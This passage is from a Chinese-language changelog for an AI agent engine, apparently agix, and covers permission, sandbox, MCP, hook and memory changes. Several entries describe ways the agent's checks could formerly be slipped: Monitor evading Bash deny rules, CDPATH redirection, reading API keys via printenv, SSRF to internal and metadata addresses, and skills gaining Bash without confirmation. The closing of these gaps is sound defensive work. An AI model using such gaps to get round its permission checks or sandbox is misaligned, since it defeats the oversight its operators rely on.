  deny / ask 规则时按询问处理;`busybox` / `flock` / `ionice` / `chrt` / `taskset` / `pkexec` /
  `caffeinate` / `su -c` / `runuser -- ` 等 wrapper 剥掉后比里面真正启动的程序。
- `Bash(...)` 的 deny / ask 规则同样管住 `Monitor`(此前只按工具名匹配,`Monitor` 逃得过)。
  一个 `Monitor` 名下的 allow 不受影响,被 `Bash` 名下的 deny/ask 收紧。
- `Bash` 超时不再丢输出:命令被停掉前打印的内容照样返回,末尾标 `[timed out after Nms]`
  (`is_error`),结构化结果多了 `timed_out`。以前超时直接以错误结束,已打印的全丢了。
- `Bash` 单行超过 64 KB 时截断并标 `…[line truncated]`,然后继续读后面的行;以前到那一行就
  静默丢掉之后的全部输出。
- 无人值守会话里,`Monitor` 的脚本在 OS 沙箱完整生效时自动放行(与 `Bash` 同一条件),以前恒为
  询问、也就是恒被拒。新设置 `sandbox.unattended_requires_network_policy`(缺省 `false`)打开后,
  `Bash` 与 `Monitor` 的这条自动放行另外要求 `sandbox.network_mode` 不是 `unrestricted`——沙箱只限写,
  网络仍是个口子;不满足就回到 allow 规则。0.4 会把缺省改成 `true`,无人值守跑命令的部署现在就可以
  把网络收成 `deny_all` / `allowlist` 并打开它。
- `plan` 模式下,只读工具自己没放行的调用改为询问,与 `default` 相同:读项目外的文件、
  `WebFetch`、只读的 MCP 工具、参数指向项目外的只读 `Bash`。以前 `plan` 对只读工具一律放行。
- `Monitor` 不再恒为只读,按它的命令用 `Bash` 的只读分类判:跑脚本、起服务的 `Monitor` 在
  `plan` 下被拒,在 `acceptEdits` 下要询问(以前两处都静默放行)。
- 子进程环境永远不带 `CDPATH`(`inherit` 与 `allowlist` 两种模式都剥掉),免得子 shell 的
  `cd foo` 落到项目外、而权限检查看的是字面 `foo`。
- 沙箱里命令的 `TMPDIR` 从 `<系统临时目录>/agix-<会话 id>` 挪到 `<状态目录>/tmp/<会话 id>`
  (缺省 `~/.agix/tmp/<会话 id>`),只有本会话的命令写得到;以前在 macOS 上它落在所有沙箱命令
  都可写的 `DARWIN_USER_TEMP_DIR` 里,会话之间彼此可写。7 天没动过的会话临时目录由之后的进程
  清掉。
- 写工具(`Write` / `Edit` / `NotebookEdit`)拒写的名单多了 `.envrc`,以及 `.agix` / `.claude`
  下的 `mcp.local.json`;与 `settings.json` 一样可用 `sandbox.allow_write` 开例外。
- 沙箱里的命令对 `.claude` 与 `.agix` 一视同仁:`.claude` 目录项本身、其下的 `settings*.json`、
  `mcp.local.json` 与 `hooks`、`agents`、`skills` 等配置目录(名单见 ARCHITECTURE §6.3)不可写;
  macOS 上不存在的 `.claude` 也建不出来。
- 子进程(`Bash`、`Monitor`、command hook、MCP stdio 服务)的环境里不再有 provider 的 key:
  任何一层设置里 provider 的 `api_key_env` 指向的变量(如 `DEEPSEEK_API_KEY`)与 `ANTHROPIC_*`
  一样剥掉。以前只剥 `ANTHROPIC_*`,别家 provider 的 key 一句 `printenv` 就读得到。确实要把它交给
  子进程的,写进 `sandbox.subprocess_env.allow`。引擎自己跑的 git(及仓库配置让它起的程序)
  同样不带这些变量。
- 无人值守会话的 `Bash` / `Monitor` 不能再请系统服务在沙箱外代办:macOS 上 `open`(经
  LaunchServices 起应用、开 URL)、`defaults write`(经 `cfprefsd` 写偏好)、`osascript` 给别的应用
  发 Apple event 都会失败;Linux 上命令进独立的 IPC 命名空间,会话 D-Bus 与 systemd 用户实例的
  socket 被遮住(`systemd-run --user`、`gdbus call --session` 失败)。有人值守的会话不变。
- agent 类型 frontmatter 的 `permission_mode` 真正作用到子 Agent 的权限判定上(以前写 `plan`
  不起作用),可以比父会话宽也可以严;父会话在 `plan` 时取两者中更严的那个,父会话是
  `bypassPermissions` 时随父会话,插件带来的类型只能收紧。团队成员(`TeamCreate`、`Agent` 的
  `team_name`)继承父会话的全部规则,模型要的 `permission_mode` 只能收紧,询问到父会话的宿主
  那里问。以前成员没有任何规则,`bypassPermissions` 整队免确认。
- 子 Agent 的询问等待上限跟会话的 `--permission-prompt-timeout`,不再固定 300 秒;在子 Agent 的
  询问上答 `permit_always`,记下的是那一条命令或路径,不再是整个工具。
- 子 Agent 能改它自己读过的已有文件了:以前读后再写的检查查的是父会话的读取记录,子 Agent 的
  `Edit` / `Write` 改已有文件总被"File must be read before editing"拒掉。
- skill 正文里的 `` !`cmd` `` 先过会话权限(按一次 `Bash` 调用):被 deny 规则拒的、要询问的
  不再执行,替换成写明原因的一行文字。要它照跑,给那条命令写 allow 规则;项目内的只读命令照旧
  直接执行。skill 自己的 `allowed-tools` 不覆盖它自己的 `` !`cmd` ``。
- 运行中新建或改动的 `<project>/.agents/skills/` 下的 skill 按项目 skill 对待(不带内容的
  `allowed-tools` 授权不生效),即使用户层有同名的 skill。以前热重载把它记成用户 skill。
- `permit_always` 的 `local` 第一次建出 `settings.local.json` 后,之后新建的会话不用
  `config.reload` 就能看到那条规则。
- **`feature_flags` 整段删除。** 还在起作用的两项挪进 `compaction`:`reactive_compact` 改成
  `compaction.reactive`,`cached_microcompact` 改成 `compaction.cached_microcompact`,含义不变、
  默认都关。`feature_flags` 留在配置里照样能加载,但整段被忽略——开着这两项的要搬过去。
  `team_mode`、`plugin_marketplace`、`extended_memory`、`experimental_agent`、
  `recorder_auto_detect`、`dream_task` 从来没有生效;`AGIX_FEATURE_*` 环境变量同样从未生效。
- 工具 `VerifyPlanExecution` 删除:它要读的计划正文从没有地方写入,调用总是报
  "No active plan found"。
- `session.export` 的 `runtime.json` 去掉 `plan_text`(一直是 `null`)。
- **MCP 的 OAuth 换了一套**(`mcp_auth.md`)。`mcp_servers` 里的 `oauth_provider` 删除:写了它
  的 server 配置整条被拒绝(启动与重载时发 `mcp_connect_failed`,`mcp.addServer` 报
  `INVALID_PARAMS`),报错里给出新写法。改成 `"oauth": {"client_id", "client_secret_env",
  "scopes", "callback_port"}`(都可省);只是想让要求登录的 server 能登录,什么都不用写。
  以前 `oauth_providers` 里的密钥字面量没有对应写法:放进环境变量,`client_secret_env` 写变量名。
  以前存在 `scenes/<id>/mcp/oauth/<provider>.json` 的令牌不再读取,要重新登录一次。
- 新方法 `mcp.auth.start` / `mcp.auth.complete` / `mcp.auth.cancel` / `mcp.auth.logout`,新通知
  `mcp_auth_required` / `mcp_auth_completed` / `mcp_auth_failed`,新错误码 `MCP_AUTH_FAILED`
  (-32021)。`mcp.status` 的元素多了 `auth`,`state` 多了 `auth_required`。
- 传输错误不再清掉 OAuth 令牌(以前任何一次重连都会清);`mcp.addServer` / `mcp.updateServer`
  加进来的 server 和启动时连的一样走 OAuth。
- 无人值守的 MCP server:`oauth.grant` 为 `client_credentials`(`client_secret_env` 或
  `private_key_jwt`)或 `enterprise`(企业托管授权;身份经新方法 `mcp.auth.setIdentity` 给)。
- MCP 策略文件多了两个可选键:`allowed_authorization_servers`(授权服务器 issuer 的 glob)与
  `enterprise_idp`。`daemon.doctor` 的 `mcp.policy` 详情相应多了这两项。
- **MCP 工具名按 API 的规则造。** 工具名(与 prompt 斜杠命令)是 `mcp__<server>__<tool>`,
  两段里 `[A-Za-z0-9_-]` 以外的字符换成 `_`;server 名有这种字符或长过 40 的,后面再接 `_`
  加六位哈希(`my server` → `mcp__my_server_<hash>__…`);整个名字超过 64 时工具段截短并接哈希。
  只用这些字符、不长的 server 名不变。名字怪的 server,权限规则要按新名字写,`MCP` 工具会列出
  每个工具的名字。工具的 `inputSchema` 顶层不是 `type: object` 的,
  按 object 报给模型。
- **MCP 有了时限。** `mcp_servers.<name>` 可带 `startup_timeout_ms` / `tool_timeout_ms`;
  缺省取环境变量 `MCP_TIMEOUT` / `MCP_TOOL_TIMEOUT`,再缺省 30 秒 / 10 分钟。握手不回、只回
  非 JSON 的 server 到时被停掉、报 `mcp_connect_failed`,不再把会话创建卡死;工具调用超时在
  server 端取消,报错。会话创建最多等 MCP 10 秒,没连完的后台接着连,连上后发 `mcp_connected`,
  会话在下一轮前换上。
- **MCP 工具调用断在途中不再重发。** server 在调用中途退出,这次调用报错(以前重连后再发一次,
  有副作用的工具会执行两遍);下一个请求重连。
- `mcp.status` 的 `state` 多了 `disconnected`、`connecting`、`failed`(带 `error`);
  `mcp_connect_failed` 的 `error` 写明原因,不再是"看 daemon 日志"。
- `session.run_turn` 的 `message` 为空或只有空白、又没有附件,报 `INVALID_PARAMS`,不再当作
  一轮发给模型。
- 模型调用的恢复对真实厂商生效了:过载(重试用尽的 529,或流里的 `overloaded_error`)配了
  `model.fallback_model` 就换它重发;尺寸被拒(400「prompt is too long」、413、流里的同类错误)
  压缩后重发。以前这些都直接以 `ENGINE_ERROR` 结束。
- 尺寸被拒之后的压缩和别的压缩是同一次压缩:跑 `PreCompact` / `PostCompact` hook
  (`trigger` 为 `"auto"`,hook 拦下就不重发、这一轮以 `ENGINE_ERROR` 结束)、配了摘要模型时
  先写摘要、补回读过的文件等提醒;被压掉的开场上下文(AGENTS.md / CLAUDE.md)下一轮重新注入。
  以前这条路径跳过了这些,开场上下文被压掉后整个会话再也不注入。
- 自动压缩把对话压到阈值减去系统提示词与工具定义之后剩下的大小。以前压到阈值本身,压完
  整个请求仍在阈值之上,之后每一步都再"压"一次:什么都丢不掉,却照样补回读过的文件、发
  `strategy: "NoOp"` 的 `compact` 帧,上下文越压越大。现在没有可丢的就什么都不做、不发帧;
  压完反而更大的(补回的提醒比丢掉的多)也不生效。`compact` 帧的 `tokens_after` 含补回的
  恢复消息。
- 开了 `compaction.reactive` 时,轮中提前清掉旧工具结果的那一趟发 `compact` 帧
  (`MicroCompact`,消息条数不变)。以前只记日志。按时间清掉旧工具结果(默认开:会话不少于
  100 条消息时清 15 分钟以前的)同样发这一帧,以前也只记日志。
- 压缩不再丢掉之前的摘要:没有摘要模型时(或摘要失败)的第二次压缩保留第一次留下的摘要,
  不再把它当作最旧的一轮删掉、或截成 200 字节。
- 工具结果预算按字符计:单条过 50,000 字符的保留前 1,000 字符,截断说明改为
  `[Tool result truncated: N characters > 50000 max; first 1000 characters preserved]`。以前按
  字节计,两万个汉字(60 KB)的结果就被截成 1,000 字节;`WebFetch` 截到 50,000 字符的页面
  同样被截。工具带回的图片也算进累计的 500,000(每张按 6,400 字符),超了从最旧的清起,
  清掉的图片换成一行 `[Old tool result image cleared]`。
- `WebFetch` 的正文放在 `<external-content source="…">…</external-content>` 里,后面一句
  说明它来自网页、不是用户的话;整个结果(头、定界、正文)至多 50,000 字符,截断时注明页面
  原长。`Read` 读项目外(不在项目、可写目录、`sandbox.read_directories` 之下)的文件同样这样
  包起来;脚本里调用的 `Read` 不包。按结果前缀匹配的(`[HTTP 200`、行号)不受影响,按结尾
  匹配的要改。
- MCP server 返回的单张图片解码后超过 3.5 MB 的,换成一行 `[image omitted: …]`,不再原样
  转给模型(超过 API 的单图上限,这一请求和之后每一个带着它的请求都会被拒)。`Read` 读超过
  3.5 MB 的图片同样报错,不再按 10 MB 的读文件上限放行。
- 一次调用在回复要工具之前失败,它推过的 `text_delta` 不进 transcript;重发前会再发一次同
  `step` 的 `step_start`(协议 §7)。流在消息结尾之前断开,以前当作一个空回答正常结束
  (`stop_reason` 为空、用量为 0),现在是 `ENGINE_ERROR`。
- `pause_turn` 不再结束一轮:引擎把那条回复发回去让模型接着写。
- `session.interrupt` 在模型还没开始回答时(等响应、退避重试之间)也立即生效。回复写到一半被
  打断的一轮以 `stop_reason: "cancelled"` 结束,不再走正常收尾(`stop_reason` 为空、照跑 Stop
  hook、送达排队消息)。
- 并发安全的工具在它的 `tool_use` 到齐时就开始跑,`tool_result` 与权限询问可能夹在同一步后面的
  `text_delta` 之间到达。
- `plugin.install` / `plugin.uninstall` 的 `name`、`version` 只收 1–128 个 ASCII 字母、数字、
  `.`、`_`、`-`、`+`,不以 `.` 开头,别的报 `INVALID_PARAMS`(以前 `{"name": "/"}` 会把根目录
  下的目录逐个当版本删掉);`plugin.install` 还要求包里 `[plugin] name` 等于 `name`。
- 团队的 `SendMessage` 只投给团队声明过的成员,`peer` 不在其中时报错并列出成员;提示词改成与
  schema 一致的 `{"peer", "message"}`(以前教的 `to` / `summary` / `"*"` 广播从来不被接受)。
  不是纯 ASCII 文件名的成员标签,邮箱文件改名为 `mailbox/~<hash>.jsonl`。
- 同一状态目录下的两个 daemon 不能同时写一个会话:会话在一个 daemon 里活着时,另一个对它
  `session.resume` / `session.run_turn` 报 `INTERNAL_ERROR`,消息含 "being written by another
  process"(以前要么两边交错写进同一份日志,要么 resume 失败后换一个新 id 建会话)。
- 会话日志最后一行写到一半(崩溃、断电)时,读的时候略过那一行而不是整份会话读不回来,
  下一次追加前把它截掉。
- 压缩标记(`compact` 行)写盘失败时,下一次落盘先补写它,之后的行跟在它后面;写进去了
  只是 fsync 失败的,只重试 fsync。以前会把压缩后的消息当普通行再写一遍,日志里同样的内容
  出现两次,恢复出来的会话前面多出一段已经被压掉的历史。
- `config.setProvider` 不再把 `api_key` 写进项目的 `.agix/settings.json`(按约定要提交的那个):
  它进同目录的 `settings.local.json`(0600),settings.json 里这个 provider 已有的 `api_key` 在下次
  写入时挪过去;响应多了 `secrets_written_to`。直接读 settings.json 找 key 的,改读合并后的
  `config.getProvider`。
- `config.get` / `scene.describe` 的脱敏键名不分大小写,多了 `authorization` 与 `*_token` /
  `*_secret` / `*_password`;`headers`、`env` 对象里的值一律脱敏(以前 MCP 的
  `Authorization` 头与 stdio `env` 原样返回)。
- skill 文件热重载时按文件所在的层定来源:项目层 `.agents/skills/` 里新出现或改动的 skill
  一律是 project 来源(以前不认识的名字一律当 user,项目里的 `allowed-tools: [Bash]` 因此免确认);
  不在任何扫描层下的文件同样按 project;后面的层占着同名 skill 时,前面层的改动不再顶替它;
  `skills/<name>/` 下 `SKILL.md` 以外的 `.md` 不再被注册成 skill。
- `skills_changed` 真的会发了:skill 文件在两轮之间增删后,下一轮开始时每个受影响的会话发一次,
  模型同时收到一条提醒。以前 daemon 就地换了 skill 目录,这个帧从来不发。
- skill frontmatter 的列表不在括号里切分:`allowed-tools: Bash(sh build.sh)` 不写成 `[列表]`
  也是一条授权(以前切成 `Bash(sh` 与 `build.sh)`,授权失效)。
- `/name` 斜杠命令展开 skill 与 `Skill` 工具完全一样:执行 `` !`cmd` ``(同样先过会话权限)、
  正文截到 8000 字符、接上 `files:`、`allowed-tools` 授权到这一轮结束、计入调用次数。
  `context: fork` 的 skill 交给子 Agent 的正文也执行 `` !`cmd` ``、同样截断。展开出的正文
  不再带 frontmatter(以前磁盘上的 skill 连 `---` 头一起交给模型)。
- 插件包带来的 skill 与项目 skill 一样,只写工具名的整类 `allowed-tools` 授权不生效,要写成
  `Tool(内容)`。
- **记忆目录只有两处**:全局 `<状态目录>/memory/`(模型照提示词写的地方)与项目的
  `<项目>/.agix/memory/`(抽取出的 `type: project`)。以前另外读的
  `<状态目录>/memory/<cwd 的哈希>/MEMORY.md` 与 `<状态目录>/memory/<改写过的 cwd>/*.md`
  不再读——引擎从不往那里写;手放过文件的,挪进 `<项目>/.agix/memory/`(带 frontmatter
  的记忆格式)或项目的 `AGENTS.md`。
- 提示词 `# Memory` 一节的索引是两处 `MEMORY.md` 合起来的,项目级的记忆也列得出来;
  `memory_enabled: false` 时声明式场景的 `memory` 提醒也不再带索引。内置场景的每轮提醒
  不再重复带索引(提示词里已经有)。
- 记忆写入不再写出半截文件:按目录串行、先写临时文件再改名;召回计数在同时召回时不丢。
- 轮末抽取的记忆里认出密钥(`sk-…`、`ghp_…`、`AKIA…`、Bearer、JWT、私钥头……)的,那一条
  不保存。记忆存到 200 条就不再抽取新的(已有的照常更新),记一条 warn,`daemon.doctor` 的
  `memory` 检查报 `degraded`(`count` / `cap`);引擎从不自动删记忆,腾地方要有人删掉一些。
- 召回超出 2 秒预算时,在途的选择调用被中止,不再在后台继续花 token。
- 模型请求在开始回答之前收到 500 / 502 / 504 / 408 的,按退避再发(两个协议都是),和 429、
  503、529 一样;以前直接失败。
- Anthropic 的 `base_url` / `ANTHROPIC_BASE_URL` 写到 `…/v1` 或写全 `…/v1/messages` 都可以,
  不再拼成 `…/v1/v1/messages`。
- OpenAI 兼容 provider 报回的 `input_tokens` 不再含已缓存的那部分(那部分在
  `cache_read_input_tokens`),和 Anthropic 的含义一致;以前缓存命中的部分算了两遍,
  `context.tokens` 与按 token 估的花费都偏大。
- Anthropic 原生搜索不再带 `anthropic-beta: web-search-20250305-2025-03-05`(`web_search_20250305`
  不需要 beta)。
- `session.delete`,以及 `session.close` / `session.delete` 级联删掉的会话,连同
  `sessions/<id>/` 整个目录一起删(会话记忆、metadata、输入历史);以前只删 `metadata.json`。
  会话还在本 daemon 里活着时只留下空的 `writer.lock`。
- `ExitWorktree` 的 `keep` 真的结束 worktree 会话(worktree 留在磁盘上),之后可以再
  `EnterWorktree`;以前会话一直留在里面,下一次进入被拒。`remove` 因为有未提交改动被拒时会话
  仍在 worktree 里,带 `discard_changes` 重试能删掉(以前 worktree 成了孤儿)。分支上有别的
  分支与远端都没有的提交时同样拒绝删除。
- `Grep` 搜 32 MiB 以内的文件(以前 4 MiB),更大的不读,结果末尾列出被跳过的文件;以前静默
  跳过,报 no matches。`multiline: true` 时 `.` 匹配换行,content 模式给出匹配跨过的每一行。
- 定时任务的 cron 表达式一直按 UTC 匹配,`CronCreate` 的说明现在也这么写,结果里带当前
  UTC 时间。`scheduled_tasks.json` 改为原子写;读不出来的文件挪到 `scheduled_tasks.json.corrupt`
  再从空表开始,不再被下一次保存覆盖。
- 新帧 `notification`(`{message,status}`,协议 §7):模型调用 `PushNotification` 时发给会话的
  订阅者,同时触发 `Notification` hook(`reason` 为通知正文,`tool_name` 为
  `PushNotification`)。宿主该把它当通知送到用户面前;macOS 上引擎所在的机器仍顺带弹一条
  桌面通知,失败不算错。
- `/cost` 报的是会话自载入以来模型调用数、工具调用数和厂商报回的四项 token,不再是按字符数
  估的美元数。
- 遥测(`telemetry/<session>.jsonl`、`pool.jsonl`、OTel)`schema_version` 升为 2:payload 不再
  重复信封的 `turn_no` / `turn_id`;从来没有发出过的 15 种事件删除(`config_loaded`、
  `tool_decision`、`intent_classified`、`interrupt_signal`、`context_window_report`、
  `model_route`、`error_record`、`mcp_server_disconnected`、`mcp_tool_call`、`agent_message`、
  `memory_snapshot`、`file_operation`、`tui_action`、`hook_execution`、`outcome_record`),
  剩 22 种;`api_error`、`permission_decision`、
  `user_prompt_submit`、`slash_command_used` 现在会发,`mcp_server_connected` /
  `mcp_connection_error` / `startup_timing` 记进 `pool.jsonl`;`Agent` 工具的子 Agent 记
  `agent_spawned` / `agent_completed`。`session_end` 的 token 与调用合计是真数,去掉
  `total_cost_usd` 与 `total_errors`;`startup_timing` 只剩 `total_startup_ms`、`config_load_ms`、
  `pool_build_ms`。遥测文件到 64 MiB 轮转到 `<file>.1`。录像目录与文件只有属主可读写。
- `Agent` 工具的 schema 去掉从未生效的 `auto_background_after_secs`。子 Agent 因 `max_turns`
  停下时,交回父会话的结果里写明这一点(以前可能是一个空结果)。`TeamCreate` 的结果不再带
  协调者的 ROLE/TOOLS 说明段。
- **`options` 逐字段读,被忽略的报在响应里。** `session.create` / `session.run_turn` /
  `session.resume` 的 `options` 里不认识的字段、值读不出来的字段(`"permission_mode": "plann"`)
  被忽略、其余照常生效,列在 `result.ignored_options`(`[{field, error}]`)里并记 warn。以前一个
  字段错了整份 `options` 悄悄当没传,`permission_mode`、`permission_rules` 一起丢掉。**下一个版本
  起改为拒绝**(`INVALID_PARAMS`),现在就该把 `ignored_options` 当错误处理。
- 会话建不回来时(例如它记录的 `provider` 已不在配置里),`session.run_turn` / `session.resume`
  报 `INTERNAL_ERROR`,不再换一个新 id、在默认项目和默认场景里建会话顶替(以前 `run_turn`
  会在那个新会话里照常跑完这一轮,结果的 `session_id` 不是请求里的那个)。
- 没有 `id` 的请求(通知)不再收到响应帧,出错和 `TOO_MANY_IN_FLIGHT` 也不回。靠无 `id` 请求
  拿结果的客户端要带上 `id`。
- `daemon.shutdown`、SIGINT / SIGTERM 先停止接受新连接再关会话;关停期间已连着的连接上新建或
  带回内存会话报错 `the daemon is shutting down`。以前关停的那几秒里还能建出会话来。
- Unix socket 建好后改成 `0600`,daemon 为它新建的目录是 `0700`;以前随 umask(通常 `0755`)。
  别的用户本来就连不上(没有写权限),放宽了 umask 的部署才受影响。
- `daemon.lock` 在 daemon 运行期间持有 `flock`:两个 daemon 同时启动只有一个能起来,另一个报
  "another daemon is already running"。以前两个可能都起来,后起的删掉先起的那个的 socket。
- 被驱逐的会话再用时,先等它旧的运行体停下(`SessionEnd` hook 跑完,最多 5 秒)再重建;以前
  旧的 `SessionEnd` hook 可能和重建出来的会话的 `SessionStart` 同时在跑。
- `--listen` 绑定非回环地址时启动打一条 warn:TCP 不加密,token 明文传输。
- settings.json 里没有任何设置读的顶层键(拼错的、别的工具的,如 `hooks`)在加载时各记一条
  warn,`daemon.doctor` 的 `settings_tiers[]` 多了 `unknown_keys`。行为不变,仍被忽略。
- `plugin.install` 披露里有超限文本(描述 > 500 字符、提示词 > 40 000 字符)的包被拒
  (`INVALID_PARAMS`)并删掉,不再是 `success: true` 加 `disclosure: {"error": …}`;agent 的
  `prompt` 读不到、MCP 的 `config` 读不到或不是 JSON 的包同样装不上。同一版本已经装过的也
  照样读回、照样披露,不过就报错。
- 披露的 `mcp_servers` 每项从 `"<名字> (native)"` 变成 `"<名字> (native): runs `<命令行>`"` /
  `"…: connects to <url> (<type>)"`,后面跟 `; env: A, B` / `; headers: …`(只有键名)。按字符串
  全等比对的要改。
- `[[agent]] prompt`、`[[mcp]] config` 和 `[[script]]` 一样必须在包里面(绝对路径、`..`、
  指到包外的符号链接都拒)。
- 安装有了上限:压缩包 128 MiB,解开后 512 MiB、10 000 个条目、单条压缩比 200 倍(> 1 MiB
  的条目)。安装先解到临时目录再改名就位,并写完成标记 `.agix-installed`;没有它的版本目录
  不算装过,再装同一版本会替换它。
- `enabled.json` 读不了或解析不了时,那一层的包全部按禁用算(以前当作空表,全部启用),
  `plugin.enable` / `plugin.disable` 拒绝覆盖它;`daemon.doctor` 多了 `plugins.enable_state`
  检查。写入改为临时文件加改名。
- 插件名黑名单删除(14 个写死的名字,只查 RPC 的 `name`)。要限定能装什么,用
  `settings.json` 的 `plugins.allow`,它按 manifest 名在发现时检查。
- 脚本绑定的预算有了封顶:`settings.json` 里的 `timeout_ms` 至多 10 000、`calls_per_turn`
  至多 100 000;插件包的 `timeout_ms` 至多 1000、`calls_per_turn` 至多 1000。写得更大的被压到
  上限并打 WARN。
- `RunCode`:主对话直接起的程序进程内同时至多 2×CPU 个(子 Agent 里的不算),多出来的等
  空位;程序结束后不理会取消的子调用最多再等 `stop_grace`(10 秒)就丢下,不再让结果一直
  挂着;时限改用单调时钟。

- **MCP 策略里 `allowed_servers` 的 `name` 规则不再放行任何 server**,`name` 只在
  `denied_servers` 里起作用。只靠 `{"name": …}` 放行的策略现在拒绝这些 server(拒绝原因会说
  明),`daemon.doctor` 的 `mcp.policy` 报 `degraded` 并在 `inert_allowed_rules` 里列出它们;
  改成 `command` / `url` 规则。`url` 规则匹配前把 `ws://` / `wss://` 当作 `http://` /
  `https://`、去掉主机名末尾的 `.`(规则里写的 `ws://` / `wss://` 同样换过来),
  `denied_servers` 因此也拦得住 WebSocket 回退和 `evil.example.` 这种写法。
- **项目层的 MCP server 读不了 daemon 的环境。** 项目 `.agix/settings.json` /
  `settings.local.json` 里声明或改过的 server——包括 `mcp.addServer` / `mcp.updateServer` 写进去
  的——`command` / `args` / `url` / `headers` 里的 `$VAR` 只用它自己 `env` 块的值展开,`env` 块
  的值本身不展开;`oauth` 里写 `client_secret_env` / `private_key_jwt.key_env` 的不连接
  (`mcp_connect_failed`,`mcp.addServer` 报 `INVALID_PARAMS`)。靠 `$GITHUB_TOKEN` 这类变量的
  项目 server,把值写成字面量,或把 server 挪到全局层 / 场景层;全局层、场景层、插件声明的
  server 照旧。项目放在 `$HOME`、`.agix` 就是全局目录的,按全局层算。
- `"type": "in_process"` 的 MCP server 配置不再被接受(从来没有实现过,连接必然失败),以
  `invalid config` 报出。`"type": "websocket"` 现在与 `web_socket` 同义。
- server 名含 `__` 或以 `_` 结尾的 MCP server,工具名改走"清洗 + 哈希"(`a__b` 的工具叫
  `mcp__a_b_<6 位哈希>__…`),本来就要哈希、清洗后以 `_` 结尾的名字(如 `docs.`)也不再带那个
  `_`。写了这些 server 的权限规则要跟着改名。
- 工具调用之后不再把每个 MCP server 的工具都重列一遍:只有发了 `tools/list_changed`(或断线
  后重连上)的 server 才在下一步重列,发了 `prompts/list_changed` 的重读它的 prompt;
  `resources/list_changed` 不触发任何事。重列失败的 server 保留原来的工具,不再让整组工具
  消失;重列得到空列表的,工具清空。
- `config.reload` 的 `routing` 多了 `mcp_connecting`:重连最多等 10 秒,没连完的在后台接着连,
  结果随后以通知到达。命令不存在、没有执行权限、URL 解析不了的 MCP server 不再退避重试
  (以前每个要等十几秒)。
- 消息里 `@server:uri` 内联的资源:`server` / `uri` 属性做了转义,正文里的 `</mcp-resource`
  被拆开,资源伪造不了闭合标签;MIME 不是 `image/*` 的二进制资源显示为
  `[binary resource: <mime>, <n> bytes]`,不再标成图片。
- MCP OAuth 回调带 `error` 时同样要求 `state` 相符;不符的被拒,登录继续等真正的回调。以前
  任何本机进程发一个 `?error=x` 就能把进行中的登录作废。
- MCP stdio server 的进程组记进孤儿登记:daemon 被 `SIGKILL` 之后,下次启动会把它们清掉。
- 只读且幂等的 MCP 工具结果超过 256 KB 的不再缓存。
- 登录之后重连失败的 `mcp_connect_failed` 的 `error` 带上失败原因。
- **command hook 的退出码按 0 / 2 / 其他来读**(`extension_points.md` 生命周期 hook 一节)。
  `exit 2` 一律拦下,理由取 stderr(为空取 stdout),stdout 不再当 JSON 读——以前 `exit 2`
  同时往 stdout 打了不是 JSON 的东西就被放行。`exit 1` 等其他非零放行并记 warn——以前
  非零退出、stdout 为空就拦下。靠 `exit 1` 拦的 hook 改成 `exit 2`。
- 没写 `timeout` 的 hook 最多跑 60 秒(以前 10 分钟);agent 型 hook 的 `timeout` 以前不生效,
  现在生效。要更久的写明 `timeout`。
- `if` 的 `""` 与 `"*"` 命中一切(以前什么都不命中,hook 从不跑);`Edit|Write` 几选一;prompt、
  http、agent 三种 hook 也认 `if`(以前被忽略,对所有调用都跑)。
- `once` 只在 hook 真正跑了之后才算用掉;以前 `if` 没命中的那次调用就把它用掉了。
- 超时、出错的 hook 在日志里记一条 warn(以前除了 command 超时都没有痕迹)。
- **`WebFetch`、`Ping` 不再能连本机与内网**:回环、私网、链路本地(含云元数据
  `169.254.169.254`)、CGNAT、`0.0.0.0`、IPv4 映射的 IPv6 等地址,写成 IP 的、名字解析到的、
  重定向过去的,都报 `Denied`。要让它们够到本机或内网的某个主机,把主机写进
  `sandbox.allowed_domains`(如 `"127.0.0.1"`、`"intranet.corp"`);`network_mode` 是缺省的
  `unrestricted` 时这份列表不限制别的主机,只起放行内部地址的作用。
- HTTP hook 防内网的检查补全:`0.0.0.0`、`[::ffff:127.0.0.1]`、`127.1`、十进制写法、带
  `user@` 的 url、IPv6 私有段与 CGNAT 都拒;重定向的每一跳都查。
- **`Stop` hook 的 `decision: "block"`(或 command `exit 2`)不再被忽略**:这一轮不结束,
  `message` 作为提醒交给模型接着做;再停下时 `Stop` 再问一遍,payload 带 `stop_hook_active: true`。
  只想记录的 `Stop` hook 若回了 `block`,现在会让模型多跑一轮。
- `TaskCompleted` / `TeammateIdle` 现在会发:团队成员(`TeamCreate` 的、`Agent` 带 `team_name`
  的)一轮结束时,payload 带 `team_name`、`teammate_name`;`TaskCompleted` 只在正常结束时发。
  不再要求配了 `Stop` hook。
- 子 Agent 用父会话的 hooks:`once` 在整棵会话树里只算一次(以前每个子 Agent 各算一次),
  `FileChanged` 一次修改只触发一次(以前每起过一个子 Agent 就多触发一次)。`SubagentStart` /
  `SubagentStop` 在后台 `Agent`、`context: fork` 的 skill、`session.startAgent`、常驻团队成员上
  也会发(以前只有前台 `Agent` 与 `TeamCreate`);常驻成员的 `SubagentStop` 在它被停掉时发,
  `stop_reason` 为 `shutdown`;取消的子 Agent 报 `cancelled`。
- `FileChanged` 也监视会话载入的 `AGENTS.md`(以前只看显式的 `instruction_file`)。
- hook payload 的 `permission_mode`、`cwd` 不再为空:工具分发里发的 `PostToolUseFailure`、
  `PermissionRequested`、`PermissionDenied`、`Notification`、`WorktreeCreate/Remove` 以及
  `TaskCreated` 带上会话当前的模式;`SubagentStart/Stop` 带子 Agent 自己的 cwd 与模式;
  `FileChanged`、`Elicitation` 与 rewake 的 `WakeEvent` 带上会话 id、项目根与模式(以前
  `session_id` 为空、`cwd` 是 daemon 进程的工作目录或空、模式写死 `default`)。
- 参数不是完整 JSON 的工具调用(多半是回复撞上输出上限被截断)不再以空参数 `{}` 去跑:
  不派发,直接给它一条 `is_error` 的 `tool_result`,说明参数不完整并附上收到的开头,模型下一步
  重新调用。`tool_use` 帧的 `input` 是 `{}`。以前这类调用拿空参数照常执行。
- 不并发安全的工具(屏障)运行期间引擎照样读模型的流,读到的等它跑完再处理;以前这段时间
  不读,长时间运行的工具让厂商那边的连接空等。
- 工具调用里的 panic(只在 `panic = "unwind"` 的构建,如 `release-fast` 与 dev)变成这次调用的
  错误结果,这一轮照常往下走;以前它让整轮失败。`release` 构建照旧中止进程。
- 常驻团队成员(`Agent` 带 `team_name` + `name`)的上限 `execution.team_max_persistent_members`
  是硬的:要新建成员时先回收最久空闲的,腾出一个位置;全都在忙就拒绝(`Denied`,"team member
  limit reached"),给已有成员发消息不受影响。以前全忙时照样新建,稳态比上限多一个。
